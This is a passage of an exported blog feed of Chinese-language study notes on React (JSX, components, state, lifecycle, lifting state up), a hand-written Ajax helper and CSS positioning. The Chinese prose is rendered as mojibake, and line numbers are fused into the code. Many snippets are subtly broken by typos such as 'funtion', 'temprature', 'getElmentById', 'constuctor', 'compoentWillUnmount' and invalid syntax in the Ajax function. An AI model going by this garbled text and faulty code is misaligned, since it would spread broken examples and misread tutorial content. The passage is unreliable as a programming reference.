ä¸ºæ‚¨éœ€è¦ä¸ºæ•°æ®å¯ä»¥æ”¹å˜çš„æ¯ç§æ–¹å¼ç¼–å†™ä¸€ä¸ªäº‹ä»¶å¤„ç†ç¨‹åºï¼Œå¹¶é€šè¿‡Reactç»„ä»¶ç®¡ç†æ‰€æœ‰è¾“å…¥çŠ¶æ€ã€‚å½“æ‚¨å°†é¢„å…ˆå­˜åœ¨çš„ä»£ç åº“è½¬æ¢ä¸ºReactæˆ–å°†Reactåº”ç”¨ç¨‹åºä¸ŽéžReactåº“é›†æˆæ—¶ï¼Œè¿™ä¼šå˜å¾—ç‰¹åˆ«çƒ¦äººã€‚åœ¨è¿™äº›æƒ…å†µä¸‹ï¼Œæ‚¨å¯èƒ½éœ€è¦æ£€æŸ¥ä¸å—æŽ§åˆ¶çš„ç»„ä»¶ï¼Œè¿™æ˜¯å®žçŽ°è¾“å…¥è¡¨å•çš„å¦ä¸€ç§æŠ€æœ¯ã€‚ ä¹ã€æå‡çŠ¶æ€Lifting State Upé€šå¸¸å‡ ä¸ªç»„ä»¶éœ€è¦æ”¾æ˜ ç›¸åŒçš„å˜åŒ–æ•°æ®ï¼Œå»ºè®®å°†å…±äº«çŠ¶æ€æå‡è‡³æœ€æŽ¥å—çš„å…±åŒç¥–å…ˆæ¸©åº¦è®¡ç®—å™¨ï¼Œç”¨äºŽè®¡ç®—åœ¨ç»™å®šæ¸©åº¦ä¸‹æ°´æ˜¯å¦æ²¸è…¾ 1234567891011121314151617181920212223242526272829303132333435363738funtion BoilingVerdict(props)&#123; if(props.celsius &gt;=100)&#123; return &lt;p&gt;The water would boil&lt;/p&gt; &#125; return &lt;p&gt; The water would not bold.&lt;/p&gt;&#125;class Calulator extends React.Component&#123; constructor(props)&#123; super(props); this.handleChange = this.handleChange.bind(this); this.state = &#123;temperature:&apos;&apos;&#125;; &#125; handleChange(e)&#123; this.setState(&#123;temperature:e.target.value&#125;); &#125; render()&#123; const temperature = this.state.temperature; return( &lt;fieldset&gt; &lt;legend&gt;Enter temperature in Celsius:&lt;/legend&gt; &lt;input value = &#123;temperature&#125; onChange = &#123;this.handleChange&#125; /&gt; &lt;BoilingVerdict celsius=&#123;parseFloat(temperature)&#125;/&gt; &lt;/fieldset&gt; ) &#125;&#125;ReactDOM.render( &lt;Calulator/&gt;, document.getElementById(&apos;root&apos;)); åŽæ° æ‘„æ°åŒæ—¶è½¬æ¢åˆ¤æ–­æ˜¯å¦æ°´æ²¸è…¾(props/stateçš„åŒºåˆ«ä½¿ç”¨)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899const scaleNames = &#123; c:&apos;Celsius&apos;, f:&apos;Fahrenheit&apos;&#125;;function toCelsius(fahrenheit)&#123; return (fahrenheit-32)*5/9;&#125;function toFahrenheit(celsius)&#123; return (celsius*9/5)+32;&#125;function tryConvert(temperature,convert)&#123; const input = parseFloat(temperature); if(Number.isNaN(input))&#123; return &apos;&apos;; &#125; const output = convert(input); const rounded = Math.round(output * 1000)/1000; return rounded.toString();&#125;funtion BoilingVerdict(props)&#123; if(props.celsius &gt;=100)&#123; return &lt;p&gt;The water would boil&lt;/p&gt; &#125; return &lt;p&gt; The water would not bold.&lt;/p&gt;&#125;class TemperatureInput extends React.Component&#123; constructor(props)&#123; super(props); this.handleChange = this.handleChange.bind(this); &#125;; handleChange(e)&#123; this.props.onTemperatureChange(e.target.value); &#125; render()&#123; const temperature = this.props.temperature; const scale = this.props.scale; return( &lt;fieldset&gt; &lt;legend&gt;Enter temperature in &#123;scaleNames[scale]&#125;:&lt;/legend&gt; &lt;input value=&#123;temperature&#125; onChange=&#123;this.handleChange&#125; /&gt; &lt;/fieldset&gt; ); &#125;&#125;class Calculator extends React.Component&#123; constructor(props)&#123; super(props); this.handleCelsiusChange = this.handleCelsiusChange.bind(this); this.handleFahrenheitChange = this.handleFahrenheitChange.bind(this); this.state = &#123;temperature: &apos;&apos;, scale: &apos;c&apos;&#125;; &#125; handleCelsiusChange(temperature)&#123; this.setState(&#123;scale:&apos;c&apos;,temprature&#125;); &#125; handleFahrenheitChange(temperature)&#123; this.setState(&#123;scale:&apos;f&apos;,temprature&#125;); &#125; render()&#123; const scale = this.state.scale; const temperature = this.state.temperature; const celsius = scale === &apos;f&apos; ? tryConvert(temperature,toCelsius) : temperature; const fahrenheit = scale === &apos;c&apos; ? tryConvert(temperature,toFahrenheit) : temperature; return( &lt;div&gt; &lt;TemperatureInput scale = &quot;c&quot; temperature = &#123;celsius&#125; onTemperatureChange = &#123;this.handleCelsiusChange&#125; /&gt; &lt;TemperatureInput scale = &quot;f&quot; temperature = &#123;fahrenheit&#125; onTemperatureChange = &#123;this.handleFahrenheitChange&#125; /&gt; &lt;BoilingVerdict celsius=&#123;parseFloat(celsius)&#125; /&gt; &lt;/div&gt; ); &#125;&#125;ReactDOM.render( &lt;Calculator /&gt;, document.getElmentById(&apos;root&apos;)); å‚è€ƒé“¾æŽ¥ï¼šhttps://react.docschina.org/docs/hello-world.html]]></content>
      <categories>
        <category>reactç›¸å…³</category>
      </categories>
      <tags>
        <tag>react</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[react-day1]]></title>
    <url>%2F2018-06-02-react-first-day.html</url>
    <content type="text"><![CDATA[react å­¦ä¹ ç¬”è®°day-01ä»‹ç»JSX const element = &lt;h1&gt;Hello, world!&lt;/h1&gt; å®ƒç§°ä¸ºJSXï¼Œæ˜¯JavaScriptçš„è¯­æ³•çš„æ‰©å±•ã€‚ é€‰æ‹©JSXçš„ç†ç”±ï¼šReactæ‹¥æŠ±æ¸²æŸ“é€»è¾‘ä¸Žå…¶ä»–UIé€»è¾‘å›ºæœ‰è€¦åˆçš„äº‹å®žï¼šäº‹ä»¶å¦‚ä½•å¤„ç†ï¼ŒçŠ¶æ€å¦‚ä½•éšäº‹ä»¶å˜åŒ–ä»¥åŠæ•°æ®å¦‚ä½•å‡†å¤‡æ˜¾ç¤ºã€‚é€šè¿‡å°†æ ‡è®°å’Œé€»è¾‘æ”¾å…¥å•ç‹¬çš„æ–‡ä»¶ä¸­ï¼ŒReactä¸å†äººä¸ºåœ°åˆ†ç¦»æŠ€æœ¯ï¼Œè€Œæ˜¯å°†é—®é¢˜ä¸Žç§°ä¸ºâ€œç»„ä»¶â€çš„æ¾æ•£è€¦åˆå•å…ƒåˆ†éš”å¼€æ¥ã€‚ åœ¨JSXä¸­åµŒå…¥è¡¨è¾¾å¼ ä¸‹é¢ä¾‹å­ä¸­ï¼Œå£°æ˜Žä¸€ä¸ªå˜é‡name,ç„¶åŽåœ¨JSXä¸­ä½¿ç”¨å®ƒåŒ…è£…åœ¨å¤§æ‹¬å·ä¸­ï¼š 1234567const name = &apos;Josn Lai&apos;;const elenment = &lt;h1&gt;Hello , &#123;name&#125;&lt;/h1&gt;;ReactDOM.render( element, document.getElementById(&apos;root&apos;)); å¯ä»¥åœ¨JSXçš„å¤§æ‹¬å·ä¸­ï¼ˆ{}ï¼‰æ”¾å…¥ä»»ä½•æœ‰æ•ˆçš„JavaScriptè¡¨è¾¾å¼ã€‚ä¸‹ä¾‹ä¸­ï¼Œå°†è°ƒç”¨JavaScriptå‡½æ•°çš„ç»“æžœåµŒå…¥åˆ°formatNameï¼ˆuserï¼‰åˆ°&lt;h1&gt;å…ƒç´ ä¸­ 123456789101112131415161718function formatName(user)&#123; return user.firstName + &apos; &apos; + user.lastName;&#125;const user = &#123; firstName: &apos;lai&apos;, lastName: &apos;binghong&apos;&#125;;const element = ( &lt;h1&gt; Hello,&#123;formatName(user)&#125;! &lt;/h1&gt;);ReactDOM.render( elememt, document.getElementById(&apos;root&apos;);); JSXä¹Ÿæ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ç¼–è¯‘ä¹‹åŽï¼ŒJSXè¡¨è¾¾å¼å˜æˆå¸¸è§„çš„JavaScriptå‡½æ•°è°ƒç”¨å¹¶è¯„ä¼°ä¸ºJavaScriptå¯¹è±¡ã€‚è¿™æ„å‘³ç€å¯ä»¥åœ¨ifè¯­å¥å’Œforå¾ªçŽ¯ä¸­æ˜¯ç”¨JSXå°†å…¶åˆ†é…ç»™å˜é‡ï¼Œå°†å…¶ä½œä¸ºå‚æ•°æŽ¥å—ï¼Œå¹¶ä»Žå‡½æ•°ä¸­è¿”å›žï¼š 123456function getGreeting(user)&#123; if(user)&#123; return &lt;h1&gt;Helloï¼Œ&#123;formatName(user)&#125;!&lt;/h1&gt; &#125; return &lt;h1&gt;Hello, Stranger.&lt;/h1&gt;&#125; ä½¿ç”¨JSXæŒ‡å®šå±žæ€§ å¯ä»¥ä½¿ç”¨å¼•å·å°†å­—ç¬¦ä¸²æ–‡å­—æŒ‡å®šä¸ºå±žæ€§ const element = &lt;div tabIndex = â€œ0â€&gt;&lt;/div&gt;; ä¹Ÿå¯ä»¥ä½¿ç”¨å¤§æ‹¬å·å°†javascriptè¡¨è¾¾å¼åµŒå…¥åˆ°å±žæ€§ä¸­ const element = &lt;img src={user.avatarUrl}&gt;&lt;/img&gt;; åœ¨å±žæ€§ä¸­åµŒå…¥javascriptè¡¨è¾¾å¼æ—¶ï¼Œè¯·å‹¿å°†å¤§æ‹¬å·æ‹¬èµ·æ¥ï¼Œåº”è¯¥ä½¿ç”¨å¼•å·ï¼ˆç”¨äºŽå­—ç¬¦ä¸²å€¼ï¼‰æˆ–å¤§æ‹¬å·ï¼ˆç”¨äºŽè¡¨è¾¾å¼ï¼‰ï¼Œä½†æ˜¯ä¸å¯ä»¥åŒæ—¶ä½¿ç”¨åŒä¸€ä¸ªå±žæ€§JSXçš„å‘½åä¸€èˆ¬ç”¨camelCaseï¼Œé©¼å³°å¼å‘½åã€‚class =&gt; className ,tabindex =&gt; tabIndex. ç”¨JSXå¯ä»¥åŒ…å«å­é¡¹ï¼Œå•æ ‡ç­¾ç”¨é—­åˆ const element = &lt;img src = {user.avatarUrl}/&gt;; JSXæ ‡ç­¾å¯èƒ½åŒ…å«å­é¡¹ï¼š 123456789const element = ( &lt;div&gt; &lt;h1&gt;Hello!&lt;/h1&gt; &lt;h2&gt;xxx&lt;/h2&gt; &lt;div&gt; ccc &lt;/div&gt; &lt;/div&gt;); JSXé˜²æ­¢æ³¨å…¥æ”»å‡»é»˜è®¤æƒ…å†µä¸‹ï¼Œreact DOM åœ¨æ¸²æŸ“ä¹‹å‰è½¬ä¹‰åµŒå…¥åœ¨JSXä¸­çš„ä»»ä½•å€¼ï¼Œå› æ­¤å®ƒç¡®ä¿ä¸ä¼šæ³¨å…¥ä»»ä½•æœªæ˜Žç¡®å†™å…¥åº”ç”¨ç¨‹åºçš„å†…å®¹ï¼Œåœ¨å‘ˆçŽ°å‰ï¼Œæ‰€æœ‰å†…å®¹éƒ½ä¼šè½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œæœ‰åŠ©äºŽé˜²æ­¢XSSæ”»å‡» JSXè¡¨ç¤ºå¯¹è±¡Babelå°†JSXç¼–è¯‘ä¸º React.createElement()è°ƒç”¨ã€‚ä¸‹æ–¹ä¸¤ä¸ªä¾‹å­æ˜¯ç›¸åŒçš„ï¼š 1234567891011const element = ( &lt;h1 className = &quot;show&quot;&gt; Hello ! &lt;/h1&gt;); const element = React.createElement( &apos;h1&apos;, &#123;className: &apos;show&apos;&#125;, &apos;Hello!&apos;); React.createElement()æ‰§è¡Œä¸€äº›æ£€æŸ¥ä»¥å¸®åŠ©ç¼–å†™æ— æŽªä»£ç ï¼Œä½†æœ¬è´¨ä¸Šå®ƒä¼šåˆ›å»ºä¸€ä¸ªå¦‚ä¸‹å¯¹è±¡ï¼š 1234567const element = &#123; type: &apos;h1&apos;, props: &#123; className :&apos;show&apos;, children: &apos;Hello!&apos; &#125;&#125; æ¸²æŸ“å…ƒç´ å…ƒç´ æ—¶React åº”ç”¨ç¨‹åºçš„æœ€å°æž„å»ºå—ä¸€ä¸ªå…ƒç´ æè¿°äº†ä½ æƒ³åœ¨å±å¹•ä¸Šçœ‹åˆ°çš„å†…å®¹ä¸Žæµè§ˆå™¨DOMå…ƒç´ ä¸åŒï¼ŒReactå…ƒç´ æ—¶æ™®é€šå…ƒç´ ï¼Œåˆ›å»ºèµ·æ¥å¾ˆä¾¿å®œï¼ŒReact DOMè´Ÿè´£æ›´æ–°DOMä»¥åŒ¹é…Reactå…ƒç´  å°†å…ƒç´ æ¸²æŸ“åˆ°DOMä¸­å‡è®¾divå­˜åœ¨äºŽhtmlæŸä¸ªæ–‡ä»¶ä¸­çš„æŸä¸ªåœ°æ–¹ &lt;div id=&quot;root&quot;&gt;&lt;/div&gt; æˆ‘ä»¬ç§°ä¹‹ä¸ºâ€œæ ¹â€DOMèŠ‚ç‚¹ï¼Œå› ä¸ºå®ƒå†…å®¹éƒ¨çš„æ‰€æœ‰å†…å®¹éƒ½å°†ç”±React DOMç®¡ç†ä»…ä½¿ç”¨React æž„å»ºçš„åº”ç”¨ç¨‹åºé€šå¸¸å…·æœ‰å•ä¸ªæ ¹DOMèŠ‚ç‚¹ï¼Œå¦‚æžœå°†Reacté›†æˆåˆ°çŽ°æœ‰çš„åº”ç”¨ç¨‹åºä¸­ï¼Œåˆ™å¯ä»¥æ ¹æ®éœ€è¦æ‹¥æœ‰å°½å¯èƒ½å¤šçš„ç‹¬ç«‹æ ¹DOMèŠ‚ç‚¹ã€‚è¦å°†Reactå…ƒç´ æ¸²æŸ“åˆ°æ ¹DOMèŠ‚ç‚¹ä¸­ï¼Œè¯·å°†ä¸¤è€…ä¼ é€’ç»™ReactDOM.render(); const element = &lt;h1&gt;Hello,world&lt;/h1&gt;;ReactDOM.render(element,documentById(&#39;root&#39;)); æ›´æ–°å‘ˆçŽ°çš„å…ƒç´ Reactå…ƒç´ æ—¶ä¸å¯å˜çš„ï¼Œä¸€æ—¦åˆ›å»ºäº†ä¸€ä¸ªå…ƒç´ ï¼Œå°±ä¸èƒ½æ›´æ”¹å…¶å­å…ƒç´ æˆ–è€…å±žæ€§ã€‚æ›´æ–°Uiçš„å”¯ä¸€æ–¹æ³•æ˜¯åˆ›å»ºä¸€ä¸ªæ–°å…ƒç´ å¹¶å°†å…¶ä¼ é€’ç»™ReactDOM.reader() æ—¶é’Ÿä¾‹å­ 1234567891011function tick()&#123; const element = ( &lt;div&gt; &lt;h1&gt;1&lt;/h1&gt; &lt;h1&gt;2&lt;/h1&gt; &lt;/div&gt; ); ReactDOM.render(element,document.getElementById(&apos;root&apos;));&#125;setInterval(tick, 1000); ç»„ä»¶å’Œé“å…·(props)ç»„ä»¶æ˜¯è®²ç”¨æˆ·ç•Œé¢ç‹¬ç«‹åˆ†å¼€ï¼Œå¯é‡å¤ä½¿ç”¨çš„éƒ¨åˆ†ï¼Œå¹¶ä¸”å¯ç‹¬ç«‹æ€è€ƒæ¯ä¸€éƒ¨åˆ† åŠŸèƒ½å’Œç±»ç»„ä»¶å®šä¹‰ç»„ä»¶çš„æœ€ç®€å•æ–¹æ³•æ˜¯ç¼–å†™ä¸€ä¸ªjavascriptå‡½æ•° 123function Welcome(x)&#123; return &lt;h1&gt;ä½ å¥½ï¼Œ&#123;x.name&#125;&lt;/h1&gt;;&#125; ä¸Šé¢çš„javascriptå‡½æ•°ä¸€ä¸ªæœ‰æ•ˆçš„Reactç»„ä»¶ï¼Œå› ä¸ºå®ƒæŽ¥å—ä¸€ä¸ªåŒ…å«æ•°æ®çš„â€˜xâ€™ï¼ˆä»£è¡¨å±žæ€§ï¼‰å¯¹è±¡å‚æ•°å¹¶è¿”å›žä¸€ä¸ªReactå…ƒç´ ï¼Œæˆ‘ä»¬ç§°è¿™äº›ç»„ä»¶ä¸ºâ€˜åŠŸèƒ½æ€§â€™ï¼Œå› ä¸ºå®ƒä»¬å®žé™…ä¸Šæ˜¯JavaScriptåŠŸèƒ½ ä¹Ÿå¯ä»¥ä½¿ç”¨ES6ç±»æ¥å®šä¹‰ç»„ä»¶ï¼š 12345class Welcome extends React.Compoent&#123; render()&#123; return &lt;h1&gt;hello, &#123;this.x.name&#125;&lt;/h1&gt; &#125;&#125; æ¸²æŸ“ç»„ä»¶ Reactå…ƒç´ å¯ä»¥è¡¨ç¤ºDOMæ ‡ç­¾ const element = &lt;div/&gt;; ä¹Ÿå¯ä»¥è¡¨ç¤ºç”¨æˆ·å®šä¹‰çš„ç»„ä»¶ const element =&lt;Welcome name=&quot;Lbh&quot;&gt;; å½“ReactæŸ¥çœ‹è¡¨ç¤ºç”¨æˆ·å®šä¹‰ç»„ä»¶çš„å…ƒç´ æ—¶ï¼Œå®ƒä¼šå°†JSXå±žæ€§ä½œä¸ºå•ä¸ªå¯¹è±¡ä¼ é€’ç»™æ­¤ç»„ä»¶ï¼Œæˆ‘ä»¬ç§°è¿™ä¸ªç»„ä»¶ä¸ºé“å…· 12345678function Welcome(props)&#123; return &lt;h1&gt;hello!&#123;props.name&#125;&lt;/h1&gt;; &#125; const element = &lt;Welcome name=&quot;Lbh&quot;/&gt;; ReactDOM.render( element, documemt.getElementById(&apos;root&apos;)); æ³¨æ„ï¼šå§‹ç»ˆä½¿ç”¨å¤§å†™å­—æ¯å¼€å§‹ç»„ä»¶åç§°ã€‚ æž„æˆç»„ä»¶ ç»„ä»¶å¯ä»¥åœ¨å…¶è¾“å‡ºä¸­å¼•ç”¨å…¶ä»–ç»„ä»¶ï¼Œä¸€ä¸ªæŒ‰é’®ã€ä¸€ä¸ªçª—ä½“ã€ä¸€ä¸ªå¯¹è¯æ¡†ã€ä¸€ä¸ªå±å¹•ï¼Œåœ¨Reactåº”ç”¨ç¨‹åºä¸­ï¼Œæ‰€æœ‰çš„è¿™äº›é€šå¸¸éƒ½è¡¨ç¤ºä¸ºç»„ä»¶ä¾‹å¦‚ï¼šåˆ›å»ºä¸€ä¸ªAppå‘ˆçŽ°Welcomeå¤šæ¬¡çš„ç»„ä»¶ 1234567891011121314151617function Welcome(x)&#123; return &lt;h1&gt;hello! &#123;x.name&#125;&lt;/h1&gt;;&#125;function App()&#123; return ( &lt;div&gt; &lt;Welcome name =&quot;1&quot;/&gt; &lt;Welcome name =&quot;2&quot;/&gt; &lt;Welcome name =&quot;3&quot;/&gt; &lt;/div&gt; );&#125;ReactDOM.render( &lt;App/&gt;, document.getElementById(&apos;root&apos;)); æå–ç»„ä»¶ä¸è¦å®³æ€•å°†ç»„ä»¶åˆ†è§£æˆæ›´å°çš„ç»„ä»¶ é“å…·æ˜¯åªè¯»çš„æ— è®ºå°†ä¸€ä¸ªç»„ä»¶å£°æ˜Žä¸ºä¸€ä¸ªå‡½æ•°è¿˜æ˜¯ä¸€ä¸ªç±»ï¼Œå®ƒéƒ½ä¸èƒ½ä¿®æ”¹å®ƒè‡ªå·±çš„é“å…·ã€‚ çŠ¶æ€å’Œç”Ÿå‘½å‘¨æœŸæ›´æ–°UIçš„æ–¹æ³•ï¼šä½¿ç”¨å®ƒReactDOM.render()æ”¹å˜å‘ˆçŽ°çš„è¾“å‡ºï¼š \ 1234567891011121314function tick()&#123; const element = ( &lt;div&gt; &lt;h1&gt;1&lt;/h1&gt; &lt;h2&gt;It is &#123;new Date().toLocaleTimeString()&#125;.&lt;/h2&gt; &lt;/div&gt; ); ReactDOM.render( element, document.getElementById(&apos;root&apos;) );&#125;setInterval(tick,1000); å°è£…æ—¶é’Ÿ: 1234567891011121314151617function Clock(props)&#123; return( &lt;div&gt; &lt;h1&gt;1&lt;/h1&gt; &lt;h2&gt;It is &#123;props.date.toLocaleTimeString()&#125;&lt;/h2&gt; &lt;/div&gt; ); function tick()&#123; ReactDOM.render( &lt;Clock date=&#123;new Date()&#125;/&gt;, document.getElementById(&apos;root&apos;) ); &#125;&#125;setInterval(tick,1000); ç»™ç»„ä»¶æ·»åŠ â€œçŠ¶æ€â€ï¼ŒçŠ¶æ€ç±»ä¼¼äºŽé“å…·ï¼Œæ˜¯ç§äººçš„å¹¶ä¸”æ˜¯å®Œå…¨ç”±ç»„ä»¶æŽ§åˆ¶çš„ã€‚ å°†å‡½æ•°è½¬æ¢ä¸ºç±»1.åˆ›å»ºä¸€ä¸ªæ‰©å±•åä¸ºES6çš„ç±»ï¼Œåç§°ç›¸åŒçš„React.Component2.ä¸ºå®ƒæ·»åŠ ä¸€ä¸ªç©ºçš„æ–¹æ³•render()3.å°†å‡½æ•°çš„ä¸»ä½“ç§»åŠ¨åˆ°renderæ–¹æ³•ä¸­4.æ›´æ¢propsç”¨this.propsçš„renderèº«ä½“5.åˆ é™¤å¤šä½™çš„ç©ºå‡½æ•°å£°æ˜Ž 12345678910class Clock extends React.Component&#123; render()&#123; return( &lt;div&gt; &lt;h1&gt;1&lt;/h1&gt; &lt;h2&gt;It is &#123;this.props.date.toLocaleTimeString()&#125;.&lt;/h2&gt; &lt;/div&gt; ) &#125;&#125; å°†æœ¬åœ°çŠ¶æ€æ·»åŠ åˆ°ç±» 12345678910111213141516171819class Clock extends React.Component&#123; constuctor(props)&#123; super(props); this.state = &#123;date: new Date()&#125;; &#125; render()&#123; return( &lt;div&gt; &lt;h1&gt;2&lt;/h1&gt; &lt;h2&gt; It is &#123;this.state.date.toLocaleTimeString()&#125;.&lt;/h2&gt; &lt;/div&gt; ); &#125;&#125;ReactDOM.render(&lt;Clock /&gt;,document.getElementById(&apos;root&apos;)); æŽ¥ä¸‹æ¥è®¾ç½®è®¡æ—¶å™¨æ¯ç§’æ›´æ–°ä¸€æ¬¡ å°†ç”Ÿå‘½å‘¨æœŸæ–¹æ³•æ·»åŠ åˆ°ç±»ä¸­ä¸€ä¸ªç»„ä»¶å®Œæ•´çš„ç”Ÿå‘½å‘¨æœŸ(lifecycle hooks)åŒ…æ‹¬å®žä¾‹åŒ–é˜¶æ®µã€æ´»åŠ¨é˜¶æ®µã€é”€æ¯é˜¶æ®µï¼Œæ¯ä¸ªé˜¶æ®µåˆç”±ç›¸åº”çš„æ–¹æ³•ç®¡ç†mounting :è¡¨ç¤ºæ­£åœ¨æŒ‚è½½è™šæ‹ŸDOMåˆ°çœŸå®žDOMupdating :è¡¨ç¤ºæ­£è¢«é‡æ–°æ¸²æŸ“unmounting:è¡¨ç¤ºæ­£åœ¨å°†è™šæ‹ŸDOMç§»é™¤çœŸå®žDOM æ¯ä¸ªè¿‡ç¨‹æä¾›äº†ä¸¤ä¸ªå‡½æ•° componentWillMount()componentDidMount()componentWillUpdate(object nextProps,object nextState)componentDidUpdate(object nextProps,object nextState)componentWillUnmount() componentDidMount() åœ¨ç»„ä»¶è¾“å‡ºå‘ˆçŽ°ç»™DOMåŽï¼Œè¯¥é’©å­è¿è¡Œï¼Œæ˜¯è®¾ç½®å®šæ—¶å™¨çš„å¥½åœ°æ–¹ 123456789componentDidMount()&#123; this.timerID = setInterval( () =&gt; this.tick(),1000 );&#125;compoentWillUnmount()&#123; clearInterval(this.timerID);&#125; æœ€ç»ˆï¼š 123456789101112131415161718192021222324252627282930313233343536class Clock extends React.Component&#123; constuctor(props)&#123; super(props); this.state = &#123;date: new Date()&#125;; &#125; componentDidMount()&#123; this.timerID = setInterval( () =&gt; this.tick(),1000 ); &#125; compoentWillUnmount()&#123; clearInterval(this.timerID); &#125; tick()&#123; this.setState(&#123; date:new Date() &#125;); &#125; render()&#123; return( &lt;div&gt; &lt;h1&gt;2&lt;/h1&gt; &lt;h2&gt; It is &#123;this.state.date.toLocaleTimeString()&#125;.&lt;/h2&gt; &lt;/div&gt; ); &#125;&#125;ReactDOM.render( &lt;Clock /&gt;, document.getElementById(&apos;root&apos;)); æ­£ç¡®ä½¿ç”¨çŠ¶æ€ï¼ˆStateï¼‰setState()æ¥æ”¹å˜çŠ¶æ€ï¼ŒçŠ¶æ€çš„æ›´æ–°å¯èƒ½æ˜¯å¼‚æ­¥çš„ 12345this.setState(function(prevState,props)&#123; return&#123; counter:pervState.counter + props.increment &#125;;&#125;); å‚è€ƒé“¾æŽ¥ï¼šhttps://react.docschina.org/docs/hello-world.html]]></content>
      <categories>
        <category>reactç›¸å…³</category>
      </categories>
      <tags>
        <tag>react</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[åŽŸç”Ÿjså®žçŽ°Ajax]]></title>
    <url>%2F2018-05-16-originjsAjax.html</url>
    <content type="text"><![CDATA[åŽŸç”Ÿjså®žçŽ°Ajax1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465function ajax()&#123;var ajaxData = &#123; type:arguments[0].type || 'GET', urlï¼šarguments[0].url || '', aysnc:arguments[0].async || 'true', data:arguments[0].data || null, dataType:arguments[0].dataType || 'text', contentType:arguments[0].contentType || 'application/x-www-form-urlencoded', beforeSend:arguments[0].beforeSend || function()&#123;&#125;, success:arguments[0].success || function()&#123;&#125;, error:arguments[0].error || function()&#123;&#125;,&#125;ajaxData.beforeSend()&#123; var xhr = createxmlHttpRequest(); xhr.responseType = ajaxData.dataType; xhr.open(ajaxData.type,ajaxData.url,ajaxData.async); xhr.setRequestHeader("Content-Type",ajaxData.contentType); xhr.send(convertData(ajaxData.data)); xhr.onreadystatechange = function() &#123; if (xhr.readyState == 4) &#123; if(xhr.status == 200)&#123; ajaxData.success(xhr.response) &#125;else&#123; ajaxData.error() &#125; &#125; &#125;&#125;function createxmlHttpRequest() &#123; if (window.ActiveXObject) &#123; return new ActiveXObject("Microsoft.XMLHTTP"); &#125; else if (window.XMLHttpRequest) &#123; return new XMLHttpRequest(); &#125; &#125; function convertData(data)&#123; if( typeof data === 'object' )&#123; var convertResult = "" ; for(var c in data)&#123; convertResult+= c + "=" + data[c] + "&amp;"; &#125; convertResult=convertResult.substring(0,convertResult.length-1) return convertResult; &#125;else&#123; return data; &#125; &#125;&#125;// è°ƒç”¨ajax(&#123; type:"POST", url:"ajax.php", dataType:"json", data:&#123;"val1":"abc","val2":123,"val3":"456"&#125;, beforeSend:function()&#123; //some js code &#125;, success:function(msg)&#123; console.log(msg) &#125;, error:function()&#123; console.log("error") &#125; &#125;)]]></content>
      <categories>
        <category>javaScriptç›¸å…³</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[positionå››ä¸ªå±žæ€§çš„åŒºåˆ«]]></title>
    <url>%2F2018-05-16-position.html</url>
    <content type="text"><![CDATA[ç®€æžpositionå››ä¸ªå±žæ€§static(é»˜è®¤)é»˜è®¤å€¼ï¼Œæ²¡æœ‰å®šä½ï¼Œå…ƒç´ å‡ºçŽ°åœ¨æ­£å¸¸çš„æµä¸­ï¼ˆå¿½ç•¥top\bottom\left\right\z-indexï¼‰ relative(ç›¸å¯¹å®šä½)ç”Ÿæˆç›¸å¯¹å®šä½çš„å…ƒç´ ï¼Œé€šè¿‡top\bottom\left\rightçš„è®¾ç½®ï¼Œç›¸å¯¹äºŽå…¶æ­£å¸¸ï¼ˆåŽŸå…ˆæœ¬èº«ï¼‰ä½ç½®è¿›è¡Œå®šä½ã€‚å¯é€šè¿‡z-indexè¿›è¡Œå±‚æ¬¡åˆ†çº§ã€‚ absolute(ç»å¯¹å®šä½)ç”Ÿæˆç»å¯¹å®šä½çš„å…ƒç´ ï¼Œç›¸å¯¹äºŽstaticå®šä½ä»¥å¤–çš„ç¬¬ä¸€ä¸ªçˆ¶å…ƒç´ è¿›è¡Œå®šä½ã€‚å…ƒç´ çš„ä½ç½®é€šè¿‡left\bottom\right\topå±žæ€§è¿›è¡Œè§„å®šï¼Œå¯ä»¥é¢é€šè¿‡z-indexè¿›è¡Œå±‚æ¬¡åˆ†çº§ fixed(å›ºå®šå®šä½)ç”Ÿæˆç»å¯¹å®šä½çš„å…ƒç´ ï¼Œç›¸å¯¹äºŽæµè§ˆå™¨çª—å£è¿›è¡Œå®šä½ã€‚å…ƒç´ çš„ä½ç½®é€šè¿‡left\top\bottom\rightå±žæ€§è¿›è¡Œè§„å®šï¼Œå¯ä»¥é€šè¿‡z-indexè¿›è¡Œå±‚æ¬¡åˆ†çº§ è¯¦è§£relativeå®šä½ä¸ºrelativeçš„å…ƒç´ è„±ç¦»æ­£å¸¸çš„æ–‡æœ¬æµä¸­ï¼Œä½†å…¶åœ¨æ–‡æœ¬æµä¸­çš„ä½ç½®ä¾ç„¶å­˜åœ¨ä»–æ˜¯é»˜è®¤å‚ç…§çˆ¶çº§çš„åŽŸå§‹ç‚¹ä¸ºåŽŸå§‹ç‚¹ï¼Œæ— çˆ¶çº§åˆ™ä»¥æ–‡æœ¬æµçš„é¡ºåºåœ¨ä¸Šä¸€ä¸ªå…ƒç´ çš„åº•éƒ¨ä¸ºåŽŸå§‹ç‚¹ï¼Œé…åˆTRBLè¿›è¡Œå®šä½ï¼Œå½“çˆ¶çº§å†…æœ‰paddingç­‰CSSå±žæ€§æ—¶ï¼Œå½“å‰çº§çš„åŽŸå§‹ç‚¹åˆ™å‚ç…§çˆ¶çº§å†…å®¹åŒºçš„åŽŸå§‹ç‚¹è¿›è¡Œå®šä½ï¼Œæœ‰ä»¥ä¸‹å±žæ€§ï¼š å¦‚æžœæ²¡æœ‰TRBLï¼Œä»¥çˆ¶çº§çš„å·¦ä¸Šè§’ï¼Œåœ¨æ²¡æœ‰çˆ¶çº§çš„æ—¶å€™ï¼Œä»–æ˜¯å‚ç…§æµè§ˆå™¨å·¦ä¸Šè§’(åˆ°è¿™é‡Œå’Œabsoluteç¬¬ä¸€æ¡ä¸€æ ·)ï¼Œå¦‚æžœåœ¨æ²¡æœ‰çˆ¶çº§å…ƒç´ 